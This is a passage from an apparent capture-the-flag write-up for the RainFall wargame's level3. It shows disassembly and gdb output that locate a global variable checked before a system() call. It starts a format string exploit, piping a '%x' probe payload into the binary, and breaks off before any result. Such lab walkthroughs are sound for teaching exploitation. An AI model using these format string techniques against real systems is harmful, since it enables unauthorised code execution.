So we can see that ```fgets``` functions is called, waiting for our input, its no more ```gets``` so its protected to buffer overflow. But it called ```printf``` to print it, so we can try to exploit this. The next instructions are crucials : 
```
0x080484d5 <+49>:	call   0x8048390 <printf@plt>
0x080484da <+54>:	mov    0x804988c,%eax
0x080484df <+59>:	cmp    $0x40,%eax
0x080484e2 <+62>:	jne    0x8048518 <v+116>
```
After the called of ```printf```, the register eax is equal to the value of this adress ```0x804988c```. A comparaison is made between $eax and $0x40, or 64 in decimal. If its equal to that, it calls the function ```system```.

```
(gdb) print *0x804988c
$1 = 0
(gdb) x/s 0x804988c
0x804988c <m>:	 ""
(gdb) print &m
$2 = (<data variable, no debug info> *) 0x804988c
```

At this address is stored a variable, called m, equal to 0. So we need to change the value of this variable to 64, so $eax will be 64, successing the JNE instructions.

```
level3@RainFall:~$ python -c "print('BBBB' + '_%x' * 10)" > /tmp/exploit 
level3@RainFall:~$ cat /tmp/exploit | ./level3 
